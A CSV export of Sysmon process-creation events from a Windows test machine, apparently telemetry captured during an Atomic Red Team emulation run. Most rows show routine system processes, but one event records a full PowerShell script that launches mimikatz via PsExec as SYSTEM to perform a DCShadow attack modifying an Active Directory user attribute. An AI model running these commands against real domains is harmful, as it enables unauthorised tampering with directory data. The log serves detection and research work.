Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,RenderingInfo,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\appidcertstorecheck.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,AppID Certificate Store Verification Task,1,19577,10.0.22621.2506 (WinBuild.160101.0800),"MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6",C:\Windows\System32\appidcertstorecheck.exe,System,0x8000000000000000,Information,{f57bd86a-36f6-658c-e503-000000000000},0x3e5,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:27:33.993

ProcessGuid: {f57bd86a-a4d5-658c-cc01-000000000f00}

ProcessId: 10652

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM",Info,AppIDCertstoreCheck.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-a4d5-658c-cc01-000000000f00},3588,10652,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:27:33.9975270Z,,Process Create (rule: ProcessCreate),0,5124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 22:27:33.993,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:27:33.9975270Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:27:33.993</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4d5-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">10652</Data>
      <Data Name=""Image"">C:\Windows\System32\appidcertstorecheck.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">AppID Certificate Store Verification Task</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">AppIDCertstoreCheck.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\appidcertstorecheck.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f6-658c-e503-000000000000}</Data>
      <Data Name=""LogonId"">0x3e5</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1496</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:27:33.993

ProcessGuid: {f57bd86a-a4d5-658c-cc01-000000000f00}

ProcessId: 10652

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe ""log C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999"" ""exit"" ",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,1,19576,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,High,0x8000000000000000,Information,{f57bd86a-36f9-658c-bff7-020000000000},0x2f7bf,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:59.457

ProcessGuid: {f57bd86a-a4b3-658c-c801-000000000f00}

ProcessId: 4636

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe ""log C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999"" ""exit"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-bff7-020000000000}

LogonId: 0x2F7BF

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ParentProcessId: 5368

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-a4ae-658c-c401-000000000f00},5368,WINDEV2309EVAL\User,{f57bd86a-a4b3-658c-c801-000000000f00},3588,4636,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:59.4584354Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:26:59.457,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:59.4584354Z""/>
      <EventRecordID>19576</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:59.457</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4b3-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">4636</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe ""log C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999"" ""exit"" </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-bff7-020000000000}</Data>
      <Data Name=""LogonId"">0x2f7bf</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a4ae-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5368</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
&amp; \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:59.457

ProcessGuid: {f57bd86a-a4b3-658c-c801-000000000f00}

ProcessId: 4636

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe ""log C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999"" ""exit"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-bff7-020000000000}

LogonId: 0x2F7BF

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ParentProcessId: 5368

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
&amp; \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""ctfmon.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,CTF Loader,1,19575,10.0.22621.1 (WinBuild.160101.0800),"MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240",C:\Windows\System32\ctfmon.exe,System,0x8000000000000000,Information,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:56.246

ProcessGuid: {f57bd86a-a4b0-658c-c701-000000000f00}

ProcessId: 2836

Image: C:\Windows\System32\ctfmon.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: CTF Loader

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CTFMON.EXE

CommandLine: ""ctfmon.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {f57bd86a-36f5-658c-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240

ParentProcessGuid: {f57bd86a-36f7-658c-3200-000000000f00}

ParentProcessId: 2540

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService

ParentUser: NT AUTHORITY\SYSTEM",Info,CTFMON.EXE,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService,C:\Windows\System32\svchost.exe,{f57bd86a-36f7-658c-3200-000000000f00},2540,NT AUTHORITY\SYSTEM,{f57bd86a-a4b0-658c-c701-000000000f00},3588,2836,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:56.2487868Z,,Process Create (rule: ProcessCreate),1,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 22:26:56.246,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:56.2487868Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:56.246</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4b0-658c-c701-000000000f00}</Data>
      <Data Name=""ProcessId"">2836</Data>
      <Data Name=""Image"">C:\Windows\System32\ctfmon.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">CTF Loader</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CTFMON.EXE</Data>
      <Data Name=""CommandLine"">""ctfmon.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f7-658c-3200-000000000f00}</Data>
      <Data Name=""ParentProcessId"">2540</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:56.246

ProcessGuid: {f57bd86a-a4b0-658c-c701-000000000f00}

ProcessId: 2836

Image: C:\Windows\System32\ctfmon.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: CTF Loader

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CTFMON.EXE

CommandLine: ""ctfmon.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {f57bd86a-36f5-658c-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240

ParentProcessGuid: {f57bd86a-36f7-658c-3200-000000000f00}

ParentProcessId: 2540

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,consent.exe 6032 922 000001B71E6A5040,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Consent UI for administrative applications,1,19574,10.0.22621.2506 (WinBuild.160101.0800),"MD5=8F81A5DDAA613AE681DA25B86F727E6B,SHA256=8191FB83695F7B60B9D2D137B571EA6FFE34ED6DFAE48866BFBDC934806D5229,IMPHASH=5D0C875DBD930A73D5A983016E384930",C:\Windows\System32\consent.exe,System,0x8000000000000000,Information,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:56.087

ProcessGuid: {f57bd86a-a4b0-658c-c601-000000000f00}

ProcessId: 10940

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 6032 922 000001B71E6A5040

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {f57bd86a-36f5-658c-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=8F81A5DDAA613AE681DA25B86F727E6B,SHA256=8191FB83695F7B60B9D2D137B571EA6FFE34ED6DFAE48866BFBDC934806D5229,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {f57bd86a-36fc-658c-7f00-000000000f00}

ParentProcessId: 6032

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM",Info,consent.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,C:\Windows\System32\svchost.exe,{f57bd86a-36fc-658c-7f00-000000000f00},6032,NT AUTHORITY\SYSTEM,{f57bd86a-a4b0-658c-c601-000000000f00},3588,10940,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:56.0882449Z,,Process Create (rule: ProcessCreate),1,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 22:26:56.087,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:56.0882449Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:56.087</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4b0-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">10940</Data>
      <Data Name=""Image"">C:\Windows\System32\consent.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Consent UI for administrative applications</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">consent.exe</Data>
      <Data Name=""CommandLine"">consent.exe 6032 922 000001B71E6A5040</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=8F81A5DDAA613AE681DA25B86F727E6B,SHA256=8191FB83695F7B60B9D2D137B571EA6FFE34ED6DFAE48866BFBDC934806D5229,IMPHASH=5D0C875DBD930A73D5A983016E384930</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36fc-658c-7f00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">6032</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:56.087

